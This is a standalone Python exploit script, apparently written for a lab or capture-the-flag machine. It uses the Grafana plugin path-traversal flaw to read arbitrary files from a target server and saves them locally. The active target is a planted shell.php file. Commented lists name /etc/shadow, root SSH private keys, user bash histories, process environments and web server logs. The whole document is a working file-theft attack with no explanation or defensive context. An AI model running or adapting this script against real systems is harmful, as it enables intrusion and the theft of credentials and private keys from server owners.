from slugify import slugify
from tqdm import tqdm
import requests
from random import choice

RHOST = 'http://10.10.11.183:3000'
OUT_DIR = './out/'
USERS = ['developer', 'grafana']

FILES = [
    '/var/lib/mysql-files/shell.php',
    # '/etc/grafana/grafana.ini',
    # '/var/log/grafana/grafana.log',
    # '/var/www/html/theme.toml',
    # '/etc/mysql/conf.d/mysqld.conf',
    # '/etc/passwd',
    # '/etc/shadow',
    # '/root/.ssh/id_rsa',
    # '/root/.ssh/id_rsa.keystore',
    # '/root/.ssh/id_rsa.pub',
    # '/root/.ssh/authorized_keys',
    # '/root/.ssh/known_hosts',
    # '/var/log/auth.log',
    # '/var/log/message',
    # '/var/log/secure',
    # '/var/log/sshd.log',
    # '/var/log/auth.log',
    # '/proc/self/environ',
    # '/var/log/vsftpd.log',
    # '/var/log/mail',
    # '/etc/apache2/apache2.conf',
    # '/etc/apache2/httpd.conf',
    # '/etc/apache2/apache2.conf',
    # '/etc/httpd/httpd.conf',
    # '/etc/httpd/conf/httpd.conf',
    # '/etc/apache2/sites-enabled/000-default.conf',
    # '/usr/local/etc/apache2/httpd.conf',
    # '/var/log/apache/access.log',
    # '/var/log/apache/error.log',
    # '/var/log/apache2/error.log',
    # '/var/log/apache2/access.log',
    # '/var/log/httpd/error_log',
    # '/var/log/httpd/access_log',
    # '/var/log/httpd-error.log',
    # '/var/log/httpd-access.log',
    # '/var/log/nginx/access.log',
    # '/proc/self/stat',
    # '/proc/self/fd',
    # '/proc/self/environ'
]

USER_FILES = [
    # '/home/{USER}/.mysql.history',
    # '/home/{USER}/.ssh/id_rsa',
    # '/home/{USER}/.bashrc',
    # '/home/{USER}/.bash_history'
]

def lfi(file):
    plugin_list = [
        "alertlist",
        "annolist",
        "barchart",
        "bargauge",
        "candlestick",
        "cloudwatch",
        "dashlist",
        "elasticsearch",
        "gauge",
        "geomap",
        "gettingstarted",
        "grafana-azure-monitor-datasource",
        "graph",
        "heatmap",
        "histogram",
        "influxdb",
        "jaeger",
        "logs",
        "loki",
        "mssql",
        "mysql",
        "news",
        "nodeGraph",
        "opentsdb",
        "piechart",
        "pluginlist",
        "postgres",
        "prometheus",
        "stackdriver",
        "stat",
        "state-timeline",
        "status-histor",
        "table",
        "table-old",
        "tempo",
        "testdata",
        "text",
        "timeseries",
        "welcome",
        "zipkin"
    ]

    s = requests.Session()
    headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.' }
        
    url = RHOST + '/public/plugins/' + choice(plugin_list) + '/../../../../../../../../../../../../..' + file
    req = requests.Request(method='GET', url=url, headers=headers)
    prep = req.prepare()
    prep.url = url
    r = s.send(prep, verify=False, timeout=3)

    if 'Plugin file not found' in r.text:
        return False
    else:
        if r.status_code == 200:
            return r.text
        else:
            print('[-] Something went wrong with {}'.format(file))
            return False

if __name__ == '__main__':
    for user in USERS:
        for file in USER_FILES:
            FILES.append(file.replace('{USER}', user))

    for file in FILES:
        output = lfi(file)
        if output:
            with open(OUT_DIR + slugify(file), 'w') as out:
                out.write(output)
                print('[+] {} found and saved as {}'.format(file, slugify(file)))
